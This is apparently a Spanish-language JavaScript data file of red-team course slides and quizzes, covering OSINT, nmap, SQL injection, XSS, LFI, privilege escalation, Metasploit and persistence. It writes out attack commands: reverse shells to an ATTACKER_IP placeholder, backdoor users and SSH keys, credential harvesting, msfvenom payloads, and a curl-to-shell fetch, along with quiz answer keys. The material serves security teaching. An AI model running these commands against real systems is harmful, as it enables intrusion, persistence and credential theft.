// HACKFORGE - Red Team Module Data
// Estructura exacta para RedTeam.jsx

export const REDTEAM_MODULOS = [
  {
    id: 1,
    nombre: "Reconocimiento Pasivo",
    icon: "🔍",
    color: "#00d4ff",
    tag: "RECON",
    descripcion: "Recolecta información del objetivo sin interactuar directamente. OSINT, Google Dorks, Shodan y más.",
    lecciones: [
      {
        id: "rt1-l1",
        titulo: "¿Qué es el Reconocimiento?",
        slides: [
          {
            tag: "INTRODUCCIÓN",
            titulo: "Fase 1: Reconocimiento",
            contenido: "El reconocimiento es la primera fase de un pentest.\n\nObjetivo: recolectar la mayor cantidad de información posible sobre el target ANTES de atacarlo.\n\nCuanto más info tenemos → más preciso es el ataque → menos ruido → menos detección."
          },
          {
            tag: "CONCEPTOS",
            titulo: "Pasivo vs Activo",
            contenido: "RECONOCIMIENTO PASIVO:\n→ No interactúas con el target directamente\n→ Usas fuentes públicas (OSINT)\n→ El target NO puede detectarte\n\nRECONOCIMIENTO ACTIVO:\n→ Interactúas directamente con el target\n→ Escaneos, pings, peticiones directas\n→ El target SÍ puede detectarte en sus logs"
          },
          {
            tag: "OBJETIVOS",
            titulo: "¿Qué buscamos?",
            contenido: "— Subdominios y dominios relacionados\n— Emails corporativos de empleados\n— Roles y estructura organizacional (LinkedIn)\n— Tecnologías usadas en la web\n— IPs y rangos de red\n— Documentos públicos con metadata\n— Credenciales filtradas en brechas anteriores\n— Código fuente en repositorios públicos"
          }
        ],
        quiz: [
          {
            q: "¿Cuál es la diferencia clave entre reconocimiento pasivo y activo?",
            opts: [
              "El pasivo usa herramientas automatizadas, el activo es manual",
              "En el pasivo no interactúas con el target directamente",
              "El activo es más lento que el pasivo",
              "No hay diferencia real entre ambos"
            ],
            c: 1,
            e: "En reconocimiento pasivo usas fuentes públicas sin contactar el target. El activo implica interacción directa (pings, escaneos) que puede aparecer en los logs del objetivo."
          },
          {
            q: "¿Cuál de estas acciones es reconocimiento PASIVO?",
            opts: [
              "nmap -sV target.com",
              "ping target.com",
              "Buscar empleados de la empresa en LinkedIn",
              "Hacer un escaneo de puertos con masscan"
            ],
            c: 2,
            e: "Buscar en LinkedIn no genera tráfico hacia los sistemas del target. nmap, ping y masscan interactúan directamente con el target y son reconocimiento activo."
          },
          {
            q: "¿Qué significa la sigla OSINT?",
            opts: [
              "Open Source Intelligence",
              "Offensive Security Internet Tools",
              "Online System Investigation Technique",
              "Operating System Information Network"
            ],
            c: 0,
            e: "OSINT (Open Source Intelligence) es la recolección de información desde fuentes públicas y abiertas: redes sociales, registros DNS, bases de datos públicas, etc."
          }
        ]
      },
      {
        id: "rt1-l2",
        titulo: "Google Dorks",
        slides: [
          {
            tag: "HERRAMIENTA",
            titulo: "Google Hacking / Dorks",
            contenido: "Los Google Dorks son búsquedas avanzadas que permiten encontrar información sensible indexada públicamente.\n\n→ Paneles de administración expuestos\n→ Archivos de configuración con credenciales\n→ Cámaras IP sin autenticación\n→ Bases de datos accesibles\n→ Directorios con listado abierto"
          },
          {
            tag: "TÉCNICA",
            titulo: "Operadores principales",
            contenido: "site:empresa.com — busca solo dentro del dominio\nfiletype:pdf — busca tipo de archivo específico\nintitle:\"admin\" — palabras en el título de la página\ninurl:login — palabras en la URL\ncache:empresa.com — versión en caché de Google\n\nEjemplos combinados:\nsite:empresa.com filetype:pdf\nsite:empresa.com inurl:admin intitle:login\nsite:empresa.com ext:sql OR ext:bak OR ext:env"
          },
          {
            tag: "RECURSO",
            titulo: "GHDB - Google Hacking Database",
            contenido: "La GHDB en exploit-db.com/google-hacking-database tiene miles de dorks organizados:\n\n— Files containing passwords\n— Sensitive Directories\n— Web Server Detection\n— Vulnerable Files\n— Footholds (puntos de entrada)\n\nPRO TIP: También funciona en Bing y DuckDuckGo con operadores similares."
          }
        ],
        quiz: [
          {
            q: "¿Qué operador de Google Dork busca solo dentro de un dominio específico?",
            opts: ["filetype:", "site:", "inurl:", "intitle:"],
            c: 1,
            e: "El operador site: limita los resultados a un dominio específico. Ejemplo: site:empresa.com muestra solo páginas indexadas de ese dominio."
          },
          {
            q: "¿Qué dork encontraría archivos PDF en empresa.com?",
            opts: [
              "empresa.com type:pdf",
              "site:empresa.com filetype:pdf",
              "find:empresa.com file:pdf",
              "domain:empresa.com pdf"
            ],
            c: 1,
            e: "La combinación site: + filetype: es la forma estándar de buscar archivos de un tipo específico dentro de un dominio."
          },
          {
            q: "¿Dónde está la base de datos oficial de Google Dorks (GHDB)?",
            opts: [
              "github.com/google-dorks",
              "exploit-db.com/google-hacking-database",
              "shodan.io/dorks",
              "hacktricks.xyz"
            ],
            c: 1,
            e: "La GHDB está en exploit-db.com y es mantenida por Offensive Security. Tiene miles de dorks categorizados por tipo de información sensible."
          }
        ]
      },
      {
        id: "rt1-l3",
        titulo: "Shodan y theHarvester",
        slides: [
          {
            tag: "HERRAMIENTA",
            titulo: "Shodan - El buscador de hackers",
            contenido: "Shodan indexa dispositivos conectados a internet: routers, cámaras, servidores industriales, bases de datos expuestas, IoT.\n\nhostname:empresa.com\norg:\"Empresa S.A.\"\nport:22 country:CL\nproduct:Apache city:\"Santiago\"\nssl.cert.subject.cn:empresa.com\n\n→ Muestra versiones, banners, ubicación\n→ Detecta servicios vulnerables sin tocar el target"
          },
          {
            tag: "HERRAMIENTA",
            titulo: "theHarvester",
            contenido: "theHarvester recolecta emails, subdominios, hosts y nombres de empleados desde Google, Bing, LinkedIn, Shodan y más.\n\ntheHarvester -d empresa.com -b google\ntheHarvester -d empresa.com -b linkedin\ntheHarvester -d empresa.com -b all -l 500\n\n→ -d : dominio objetivo\n→ -b : fuente (google, bing, linkedin, shodan, all)\n→ -l : límite de resultados"
          },
          {
            tag: "HERRAMIENTAS",
            titulo: "Más herramientas OSINT",
            contenido: "— Maltego → mapeo visual de relaciones entre entidades\n— Recon-ng → framework OSINT modular (tipo Metasploit)\n— SpiderFoot → automatiza OSINT en múltiples fuentes\n— Censys → similar a Shodan, más detalle en certificados\n— Hunter.io → emails corporativos verificados\n— DNSdumpster → DNS recon, subdominios, MX records\n— Amass → enumeración avanzada de subdominios"
          }
        ],
        quiz: [
          {
            q: "¿Para qué sirve Shodan principalmente?",
            opts: [
              "Escanear puertos de una IP específica",
              "Buscar dispositivos y servicios conectados a internet",
              "Hacer ataques de fuerza bruta",
              "Analizar tráfico de red en tiempo real"
            ],
            c: 1,
            e: "Shodan indexa banners y servicios de dispositivos conectados a internet. Permite encontrar sistemas expuestos sin interactuar con ellos directamente."
          },
          {
            q: "¿Qué hace theHarvester con el parámetro -b?",
            opts: [
              "Define el dominio objetivo",
              "Define la fuente de búsqueda (google, linkedin, shodan...)",
              "Limita el número de resultados",
              "Exporta los resultados a un archivo"
            ],
            c: 1,
            e: "El parámetro -b define el backend o fuente de datos. Con -b all usa todas las fuentes disponibles para máxima cobertura."
          },
          {
            q: "¿Qué herramienta permite visualizar gráficamente las relaciones entre entidades OSINT?",
            opts: ["theHarvester", "Shodan", "Maltego", "Recon-ng"],
            c: 2,
            e: "Maltego crea grafos visuales que muestran relaciones entre personas, dominios, IPs, empresas y más. Es muy útil para entender la superficie de ataque completa."
          }
        ]
      }
    ]
  },
  {
    id: 2,
    nombre: "Escaneo y Enumeración",
    icon: "📡",
    color: "#7c3aed",
    tag: "SCAN",
    descripcion: "Identifica puertos abiertos, servicios activos y versiones. Descubre la superficie de ataque del objetivo.",
    lecciones: [
      {
        id: "rt2-l1",
        titulo: "Nmap Fundamentos",
        slides: [
          {
            tag: "HERRAMIENTA",
            titulo: "Nmap - El escáner definitivo",
            contenido: "Nmap (Network Mapper) es el estándar para escaneo de redes. Descubre:\n\n— Hosts activos en la red\n— Puertos abiertos / cerrados / filtrados\n— Servicios y versiones exactas\n— Sistema operativo del target\n— Scripts NSE para detección de vulnerabilidades\n\nnmap es gratuito, open source, y preinstalado en Kali Linux."
          },
          {
            tag: "TÉCNICA",
            titulo: "Tipos de escaneo",
            contenido: "-sS → SYN Scan (sigiloso, más usado, requiere root)\n-sT → TCP Connect (completo, sin root, más ruidoso)\n-sU → UDP Scan (lento pero importante para DNS, SNMP)\n-sN → Null Scan (evasión de firewall)\n-sV → Detección de versiones de servicios\n-O  → Detección de sistema operativo\n\nnmap -sS -sV -O 192.168.1.1\nnmap -p- 192.168.1.1\nnmap -p 22,80,443,3306 192.168.1.1"
          },
          {
            tag: "AVANZADO",
            titulo: "NSE - Nmap Scripting Engine",
            contenido: "Los scripts NSE amplían Nmap con tareas específicas.\n\nnmap --script=vuln 192.168.1.1\nnmap --script=http-enum 192.168.1.1\nnmap --script=smb-vuln-ms17-010 192.168.1.1\nnmap -sV --script=banner 192.168.1.1\n\n→ vuln: busca vulnerabilidades conocidas\n→ http-enum: enumera directorios web\n→ smb-vuln-ms17-010: detecta EternalBlue\n→ banner: captura banners de servicios"
          }
        ],
        quiz: [
          {
            q: "¿Qué tipo de escaneo Nmap es el más sigiloso?",
            opts: ["-sT (TCP Connect)", "-sS (SYN Scan)", "-sU (UDP)", "-sN (Null)"],
            c: 1,
            e: "El SYN Scan (-sS) envía solo el primer paquete del handshake TCP y nunca completa la conexión, dejando menos rastro en los logs del target."
          },
          {
            q: "¿Qué flag de Nmap activa la detección de versiones?",
            opts: ["-O", "-sS", "-sV", "-p-"],
            c: 2,
            e: "-sV activa la detección de versiones de servicios. Con esta info podemos buscar vulnerabilidades específicas de cada versión en CVE Details o Exploit-DB."
          },
          {
            q: "¿Qué hace el flag -p- en Nmap?",
            opts: [
              "Escanea solo puertos privilegiados (1-1024)",
              "Escanea todos los 65535 puertos",
              "Pausa el escaneo en cada puerto",
              "Usa protocolo pasivo"
            ],
            c: 1,
            e: "El guión (-) después de -p indica 'todos los puertos', es decir del 1 al 65535. Por defecto Nmap solo escanea los 1000 puertos más comunes."
          }
        ]
      },
      {
        id: "rt2-l2",
        titulo: "Enumeración de Servicios",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "¿Qué es la Enumeración?",
            contenido: "Enumeración = extraer información detallada de los servicios descubiertos.\n\nEs más profunda que el escaneo:\n— El escaneo dice: puerto 80 abierto, Apache 2.4.29\n— La enumeración dice: directorios /admin /backup, usuarios admin/test, versión vulnerable a CVE-2021-XXXX\n\n→ El objetivo es mapear toda la superficie de ataque antes de explotar."
          },
          {
            tag: "HERRAMIENTA",
            titulo: "Enumeración Web",
            contenido: "Fuerza bruta de directorios y archivos para encontrar rutas ocultas.\n\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\nferoxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\nffuf -w wordlist.txt -u http://target.com/FUZZ\n\n→ Busca: /admin, /backup, /api, /config, /uploads, /.git"
          },
          {
            tag: "HERRAMIENTA",
            titulo: "Enumeración SMB",
            contenido: "SMB (puerto 445) es clave en redes Windows. Puede exponer usuarios, shares y archivos compartidos.\n\nenum4linux -a 192.168.1.1\nsmbclient -L //192.168.1.1 -N\nsmbmap -H 192.168.1.1\n\n→ enum4linux: extrae usuarios, grupos, shares, políticas\n→ smbclient: accede a shares como si fuera FTP\n→ smbmap: muestra permisos de cada share (READ/WRITE)"
          }
        ],
        quiz: [
          {
            q: "¿Para qué se usa Gobuster/Feroxbuster?",
            opts: [
              "Escanear puertos de la red",
              "Fuerza bruta de directorios y archivos en servidores web",
              "Capturar paquetes de red",
              "Inyección SQL automatizada"
            ],
            c: 1,
            e: "Gobuster y Feroxbuster prueban miles de palabras de un diccionario como rutas web para descubrir directorios y archivos ocultos que no están vinculados en la página."
          },
          {
            q: "¿En qué puerto opera el protocolo SMB?",
            opts: ["22", "80", "445", "3389"],
            c: 2,
            e: "SMB opera en el puerto 445 (y el antiguo 139 via NetBIOS). Es el protocolo de compartición de archivos en redes Windows y frecuentemente mal configurado."
          },
          {
            q: "¿Qué herramienta es específica para enumerar recursos SMB?",
            opts: ["gobuster", "nmap", "enum4linux", "hydra"],
            c: 2,
            e: "enum4linux está diseñada específicamente para extraer información de hosts Windows/Samba via SMB: usuarios, grupos, shares, políticas de contraseñas y más."
          }
        ]
      }
    ]
  },
  {
    id: 3,
    nombre: "Explotación Web",
    icon: "💥",
    color: "#dc2626",
    tag: "EXPLOIT",
    descripcion: "SQL Injection, XSS, LFI, Command Injection y las vulnerabilidades del OWASP Top 10.",
    lecciones: [
      {
        id: "rt3-l1",
        titulo: "SQL Injection",
        slides: [
          {
            tag: "VULNERABILIDAD",
            titulo: "SQL Injection",
            contenido: "SQLi ocurre cuando la app incluye datos del usuario directamente en una consulta SQL sin sanitizar.\n\nPERMITE:\n— Leer toda la base de datos\n— Bypassear autenticación\n— Modificar o eliminar datos\n— En algunos casos, ejecutar comandos del sistema\n\nEJEMPLO: SELECT * FROM users WHERE user='$_GET[user]' — si user=' OR 1=1 -- la consulta devuelve todos los usuarios."
          },
          {
            tag: "TÉCNICA",
            titulo: "SQLi Manual - Primeros pasos",
            contenido: "PASO 1 — Detectar si es vulnerable:\nAgregar una comilla ' al parámetro → si hay error SQL → vulnerable\n\nPASO 2 — Login bypass:\nUsuario: admin' --\nContraseña: cualquier_cosa\n\nPASO 3 — UNION para extraer datos:\n' UNION SELECT null,username,password FROM users --\n\nPASO 4 — Encontrar número de columnas:\n' ORDER BY 1-- , ' ORDER BY 2-- (hasta que falle)"
          },
          {
            tag: "HERRAMIENTA",
            titulo: "SQLMap - Automatización",
            contenido: "sqlmap detecta y explota automáticamente SQLi.\n\nsqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D mydb --tables\nsqlmap -u 'http://target.com/page?id=1' -D mydb -T users --dump\nsqlmap -u 'http://target.com/login' --data='user=admin&pass=test' --dbs\n\n→ --dbs: lista bases de datos\n→ --tables: lista tablas\n→ --dump: extrae contenido de la tabla"
          }
        ],
        quiz: [
          {
            q: "¿Qué payload básico se usa para bypassear un login con SQLi?",
            opts: [
              "SELECT * FROM users",
              "' OR 1=1 --",
              "admin AND 1=1",
              "1; DROP TABLE users"
            ],
            c: 1,
            e: "' OR 1=1 -- cierra la comilla del campo, agrega una condición siempre verdadera (1=1) y comenta el resto de la consulta con --. Esto hace que la condición WHERE sea siempre true."
          },
          {
            q: "¿Qué hace sqlmap con el parámetro --dbs?",
            opts: [
              "Define la base de datos a atacar",
              "Lista todas las bases de datos disponibles en el servidor",
              "Hace dump completo de todas las tablas",
              "Activa el modo debug"
            ],
            c: 1,
            e: "--dbs le dice a sqlmap que enumere todas las bases de datos disponibles. Luego con -D [nombre] --tables listas las tablas de esa DB."
          },
          {
            q: "¿Cuál es el primer indicador de vulnerabilidad SQLi?",
            opts: [
              "La página carga más lento de lo normal",
              "Aparece un error de SQL al agregar una comilla simple",
              "El servidor responde con código 404",
              "El navegador muestra una alerta JavaScript"
            ],
            c: 1,
            e: "Un error de SQL como 'You have an error in your SQL syntax' al agregar una comilla indica que el input se está concatenando directamente en la consulta sin sanitizar."
          }
        ]
      },
      {
        id: "rt3-l2",
        titulo: "XSS y LFI",
        slides: [
          {
            tag: "VULNERABILIDAD",
            titulo: "Cross-Site Scripting (XSS)",
            contenido: "XSS permite inyectar código JavaScript malicioso en páginas vistas por otros usuarios.\n\nUSOS:\n— Robar cookies de sesión (session hijacking)\n— Redirigir usuarios a páginas de phishing\n— Keylogging en el navegador de la víctima\n— Defacement de páginas\n\nPAYLOADS BÁSICOS:\n<script>alert(\"XSS\")</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(document.cookie)>"
          },
          {
            tag: "VULNERABILIDAD",
            titulo: "Local File Inclusion (LFI)",
            contenido: "LFI ocurre cuando la app incluye archivos del servidor usando input del usuario sin validar.\n\nURL vulnerable: http://target.com/page?file=about.php\n\nEXPLOTACIÓN:\nhttp://target.com/page?file=../../../../etc/passwd\nhttp://target.com/page?file=../../../../etc/shadow\nhttp://target.com/page?file=../../../../var/log/apache2/access.log\n\n→ ../ sube un nivel en el sistema de archivos\n→ Se repite hasta llegar a la raíz del sistema"
          },
          {
            tag: "VULNERABILIDAD",
            titulo: "Command Injection",
            contenido: "Si la app ejecuta comandos del sistema con input del usuario sin sanitizar, podemos inyectar nuestros propios comandos.\n\nEJEMPLO — campo de ping en web app:\n127.0.0.1; ls -la\n127.0.0.1 && whoami\n127.0.0.1 | cat /etc/passwd\n\nREVERSE SHELL via command injection:\n127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n→ ; encadena comandos\n→ && ejecuta si el anterior fue exitoso\n→ | pasa el output como input"
          }
        ],
        quiz: [
          {
            q: "¿Para qué se usa principalmente el XSS en un ataque?",
            opts: [
              "Para modificar la base de datos del servidor",
              "Para robar cookies de sesión de otros usuarios",
              "Para escanear puertos del servidor",
              "Para hacer fuerza bruta de contraseñas"
            ],
            c: 1,
            e: "XSS más común en ataques reales: robar cookies con document.cookie y enviarlas al atacante. Con la cookie de sesión se puede impersonar al usuario sin necesitar su contraseña."
          },
          {
            q: "¿Qué vulnerabilidad permite leer /etc/passwd del servidor?",
            opts: ["SQL Injection", "XSS Reflejado", "LFI (Local File Inclusion)", "CSRF"],
            c: 2,
            e: "LFI permite incluir archivos locales del servidor. /etc/passwd contiene nombres de usuario y /etc/shadow los hashes de contraseñas (requiere root para leer)."
          },
          {
            q: "En Command Injection, ¿qué carácter encadena dos comandos en Linux?",
            opts: ["+ (más)", "; (punto y coma)", "# (hash)", "@ (arroba)"],
            c: 1,
            e: "El punto y coma (;) ejecuta el segundo comando independientemente del resultado del primero. El operador && solo ejecuta el segundo si el primero fue exitoso."
          }
        ]
      }
    ]
  },
  {
    id: 4,
    nombre: "Escalada de Privilegios",
    icon: "⬆️",
    color: "#f59e0b",
    tag: "PRIVESC",
    descripcion: "De usuario normal a root/SYSTEM. SUID, sudo misconfigs, cron jobs, kernel exploits y más.",
    lecciones: [
      {
        id: "rt4-l1",
        titulo: "PrivEsc en Linux",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "¿Qué es Escalada de Privilegios?",
            contenido: "Después del acceso inicial somos un usuario con pocos privilegios. La escalada nos lleva a root (control total del sistema).\n\nTIPOS:\n— Vertical: usuario normal → root\n— Horizontal: usuario_A → usuario_B (mismo nivel, diferente cuenta)\n\nVECTORES COMUNES:\n— SUID binarios mal configurados\n— Comandos sudo sin contraseña\n— Cron jobs con scripts escribibles\n— Contraseñas en archivos de config\n— Vulnerabilidades del kernel"
          },
          {
            tag: "TÉCNICA",
            titulo: "Enumeración inicial",
            contenido: "Primero mapeamos el sistema para encontrar vectores.\n\nwhoami && id\nuname -a\nsudo -l\nfind / -perm -u=s -type f 2>/dev/null\ncat /etc/crontab\nls -la /etc/cron*\nenv\ncat /etc/passwd\nls -la /home/\nfind / -writable -type f 2>/dev/null | grep -v proc"
          },
          {
            tag: "TÉCNICA",
            titulo: "SUID y Sudo Misconfigs",
            contenido: "SUID: archivos que se ejecutan con permisos del dueño (root).\n→ Si hay un binario SUID conocido → GTFOBins tiene el exploit\n\nEJEMPLO SUID con find:\nfind / -exec /bin/bash -p \\; 2>/dev/null\n\nSUDO MISCONFIGURATION:\n— sudo -l muestra: (root) NOPASSWD: /usr/bin/vim\n— Exploit: sudo vim -c ':!/bin/bash'\n\n→ gtfobins.github.io: lista de exploits por binario"
          }
        ],
        quiz: [
          {
            q: "¿Qué comando muestra qué puede ejecutar el usuario actual con sudo?",
            opts: ["sudo --list", "sudo -l", "sudo show", "sudo perms"],
            c: 1,
            e: "sudo -l lista los comandos que el usuario actual puede ejecutar con sudo. Si aparece NOPASSWD significa que puede ejecutarlos sin ingresar contraseña, lo cual es un vector de PrivEsc."
          },
          {
            q: "¿Qué son los archivos SUID en Linux?",
            opts: [
              "Archivos de sistema cifrados por root",
              "Archivos que se ejecutan con permisos del dueño del archivo",
              "Scripts de inicio del sistema operativo",
              "Archivos de configuración de sudo"
            ],
            c: 1,
            e: "SUID (Set User ID) hace que el binario se ejecute con los privilegios del dueño, no del usuario que lo ejecuta. Si un binario es de root y tiene SUID, cualquiera puede ejecutar acciones como root a través de él."
          },
          {
            q: "¿Qué recurso online tiene exploits para binarios SUID conocidos?",
            opts: ["exploit-db.com", "gtfobins.github.io", "shodan.io", "cvedetails.com"],
            c: 1,
            e: "GTFOBins (gtfobins.github.io) lista binarios Unix con funcionalidades que pueden usarse para escalar privilegios, escapar de shells restringidas o transferir archivos."
          }
        ]
      },
      {
        id: "rt4-l2",
        titulo: "PrivEsc en Windows",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "Escalada en Windows",
            contenido: "En Windows el objetivo es llegar a NT AUTHORITY\\SYSTEM o Administrator.\n\nVECTORES MÁS COMUNES:\n— Servicios mal configurados (rutas sin comillas)\n— DLL Hijacking\n— Tokens de privilegios (SeImpersonatePrivilege)\n— Credenciales almacenadas (SAM, DPAPI)\n— Parches faltantes (kernel exploits)\n— AlwaysInstallElevated policy activada"
          },
          {
            tag: "TÉCNICA",
            titulo: "Enumeración en Windows",
            contenido: "whoami /priv\nnet user\nnet localgroup administrators\nsysteminfo\nwmic qfe list\ntasklist /SVC\nsc query\nicacls C:\\ruta\\servicio.exe\nreg query HKLM /f password /t REG_SZ /s"
          },
          {
            tag: "HERRAMIENTAS",
            titulo: "Herramientas automáticas",
            contenido: "WinPEAS → enumeración automática de vectores PrivEsc en Windows\nPowerUp → script PowerShell para misconfiguraciones\nSherlock → vulnerabilidades de kernel conocidas\nBeRoot → detecta problemas de configuración\n\n.\\winPEASx64.exe\n\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\nMimikatz (post-PrivEsc):\nsekurlsa::logonpasswords"
          }
        ],
        quiz: [
          {
            q: "¿Cuál es el objetivo de PrivEsc en Windows?",
            opts: [
              "Obtener acceso a la base de datos SQL",
              "Llegar a NT AUTHORITY\\SYSTEM o Administrator",
              "Instalar un keylogger sin ser detectado",
              "Desactivar el antivirus del sistema"
            ],
            c: 1,
            e: "NT AUTHORITY\\SYSTEM es el nivel de privilegio más alto en Windows, por encima del Administrador local. Equivale a root en Linux."
          },
          {
            q: "¿Qué hace WinPEAS?",
            opts: [
              "Explota vulnerabilidades automáticamente",
              "Enumera vectores de escalada de privilegios en Windows",
              "Hace dump de contraseñas de la memoria",
              "Escanea la red en busca de hosts"
            ],
            c: 1,
            e: "WinPEAS enumera el sistema y resalta en colores los vectores de PrivEsc encontrados: servicios, registros, credenciales almacenadas, permisos de archivos, etc."
          },
          {
            q: "¿Qué módulo de Mimikatz extrae contraseñas en texto claro de la memoria?",
            opts: [
              "privilege::debug",
              "sekurlsa::logonpasswords",
              "lsadump::sam",
              "token::elevate"
            ],
            c: 1,
            e: "sekurlsa::logonpasswords extrae credenciales de LSASS (Local Security Authority Subsystem), incluyendo contraseñas en texto claro si WDigest está habilitado."
          }
        ]
      },
      {
        id: "rt4-l3",
        titulo: "LinPEAS y Cron Jobs",
        slides: [
          {
            tag: "HERRAMIENTA",
            titulo: "LinPEAS",
            contenido: "LinPEAS es el estándar para enumerar automáticamente vectores de escalada en Linux. Colorea los resultados por criticidad.\n\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\nO subir al target:\nchmod +x linpeas.sh\n./linpeas.sh\n./linpeas.sh -a"
          },
          {
            tag: "TÉCNICA",
            titulo: "Interpretando LinPEAS",
            contenido: "COLORES Y SU SIGNIFICADO:\n\n🔴 ROJO/AMARILLO → 95% vector de PrivEsc\n🔴 ROJO → Alta probabilidad\n🟡 AMARILLO → Revisar con atención\n🟢 VERDE → Información interesante\n\nSIEMPRE REVISAR:\n— Binarios SUID/GUID\n— Comandos sudo permitidos\n— Cron jobs y sus permisos\n— Capabilities especiales\n— Rutas escribibles en PATH"
          },
          {
            tag: "TÉCNICA",
            titulo: "Cron Jobs - Vector clásico",
            contenido: "Si un script en cron corre como root y podemos escribir en él → escalada garantizada.\n\nDETECTAR:\ncat /etc/crontab\nls -la /etc/cron*\ncrontab -l\n\nEXPLOTAR (si el script es writable):\necho 'chmod +s /bin/bash' >> /ruta/script.sh\n# Esperamos a que cron lo ejecute...\nbash -p\n\n→ bash -p abre shell con privilegios del propietario (root)"
          }
        ],
        quiz: [
          {
            q: "¿Qué color indica alta criticidad en LinPEAS?",
            opts: ["Verde", "Azul", "Rojo/Amarillo", "Blanco"],
            c: 2,
            e: "LinPEAS usa rojo/amarillo para los hallazgos de mayor criticidad — los que tienen alta probabilidad de ser vectores de escalada de privilegios explotables."
          },
          {
            q: "¿Cómo se explota un cron job para escalar privilegios?",
            opts: [
              "Eliminando el cron job del sistema",
              "Escribiendo código malicioso en el script si tenemos permisos de escritura",
              "Cambiando la hora del sistema para adelantar el cron",
              "Reiniciando el servicio cron"
            ],
            c: 1,
            e: "Si el script ejecutado por el cron job tiene permisos de escritura para nuestro usuario pero corre como root, podemos agregar comandos. El próximo ciclo del cron los ejecutará como root."
          },
          {
            q: "¿Qué flag de LinPEAS activa el análisis más completo?",
            opts: ["-v", "-all", "-a", "-full"],
            c: 2,
            e: "El flag -a activa todas las comprobaciones incluyendo las más lentas. Sin flags LinPEAS ya es bastante completo, pero -a agrega checks adicionales que pueden tardar más tiempo."
          }
        ]
      }
    ]
  },
  {
    id: 5,
    nombre: "Post-Explotación",
    icon: "🎯",
    color: "#10b981",
    tag: "POST",
    descripcion: "Mantén el acceso, extrae información valiosa y entiende qué hacer después de comprometer un sistema.",
    lecciones: [
      {
        id: "rt5-l1",
        titulo: "Persistencia",
        slides: [
          {
            tag: "CONCEPTO",
            titulo: "Post-Explotación",
            contenido: "Una vez con acceso root/SYSTEM, los objetivos son:\n\n1. PERSISTENCIA → mantener acceso tras reinicios\n2. RECOLECCIÓN → extraer info valiosa\n3. PIVOTING → moverse a otros sistemas\n4. COVERING TRACKS → borrar evidencia\n\nEn un pentest documentamos todo. En un ataque real el atacante haría esto para mantener presencia."
          },
          {
            tag: "TÉCNICA",
            titulo: "Persistencia en Linux",
            contenido: "CLAVE SSH:\necho 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys\n\nCRONTAB BACKDOOR:\ncrontab -e\n@reboot bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\nUSUARIO BACKDOOR:\nuseradd -m -s /bin/bash h4ck3r\necho 'h4ck3r:P@ss123' | chpasswd\nusermod -aG sudo h4ck3r\n\n→ Múltiples métodos = mayor resiliencia"
          },
          {
            tag: "TÉCNICA",
            titulo: "Recolección de información",
            contenido: "ARCHIVOS SENSIBLES:\nfind / -name '*.conf' 2>/dev/null\nfind / -name '*.key' -o -name '*.pem' 2>/dev/null\ncat /etc/shadow\n\nHISTORIAL DE COMANDOS:\ncat ~/.bash_history\ncat ~/.zsh_history\n\nCREDENCIALES EN CONFIGS:\ngrep -r 'password' /var/www/ 2>/dev/null\ngrep -r 'DB_PASS' /var/www/ 2>/dev/null\ncat /var/www/html/wp-config.php"
          }
        ],
        quiz: [
          {
            q: "¿Cuál es uno de los primeros objetivos de la post-explotación?",
            opts: [
              "Apagar el servidor comprometido",
              "Mantener el acceso (persistencia)",
              "Instalar actualizaciones de seguridad",
              "Notificar al dueño del sistema"
            ],
            c: 1,
            e: "La persistencia asegura que si el sistema reinicia o la sesión se cierra, el atacante pueda volver a entrar. Es fundamental para operaciones prolongadas."
          },
          {
            q: "¿Qué archivo contiene contraseñas hasheadas en Linux?",
            opts: ["/etc/passwd", "/etc/shadow", "/etc/groups", "/etc/security"],
            c: 1,
            e: "/etc/shadow contiene los hashes de contraseñas y solo es legible por root. /etc/passwd contiene info de usuarios pero sin contraseñas (excepto sistemas muy viejos)."
          },
          {
            q: "¿Dónde se almacena el historial de comandos de bash?",
            opts: ["~/.bash_profile", "~/.bash_history", "/var/log/bash.log", "~/.bashrc"],
            c: 1,
            e: "~/.bash_history almacena los comandos ejecutados. Puede revelar contraseñas escritas en texto claro, rutas de archivos sensibles y las acciones previas del usuario."
          }
        ]
      },
      {
        id: "rt5-l2",
        titulo: "Metasploit Framework",
        slides: [
          {
            tag: "HERRAMIENTA",
            titulo: "Metasploit",
            contenido: "Metasploit es el framework de explotación más usado en el mundo.\n\nESTRUCTURA:\n— Exploits → código para explotar vulnerabilidades\n— Payloads → código que se ejecuta post-exploit\n— Auxiliares → escaneo, enumeración, fuzzing\n— Post → módulos post-explotación\n\nmsfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options\nset RHOSTS 192.168.1.1\nrun"
          },
          {
            tag: "HERRAMIENTA",
            titulo: "Meterpreter",
            contenido: "Meterpreter es el payload más poderoso de Metasploit. Corre en memoria, cifrado, difícil de detectar.\n\nsysinfo\ngetuid\ngetsystem\nhashdump\nshell\ndownload /ruta/archivo\nupload archivo /ruta/destino\nrun post/multi/recon/local_exploit_suggester\nrun post/windows/gather/credentials/credential_collector\nroute add 10.10.10.0/24 [session_id]"
          },
          {
            tag: "HERRAMIENTA",
            titulo: "Msfvenom - Payloads",
            contenido: "Msfvenom genera ejecutables maliciosos (payloads) para diferentes plataformas.\n\nWindows reverse shell:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe\n\nLinux reverse shell:\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload.elf\n\nPHP webshell:\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php"
          }
        ],
        quiz: [
          {
            q: "¿Qué comando de Meterpreter intenta escalar privilegios automáticamente?",
            opts: ["sysinfo", "getsystem", "hashdump", "getuid"],
            c: 1,
            e: "getsystem intenta varios métodos automáticos para escalar a SYSTEM en Windows: named pipe impersonation, token duplication, etc."
          },
          {
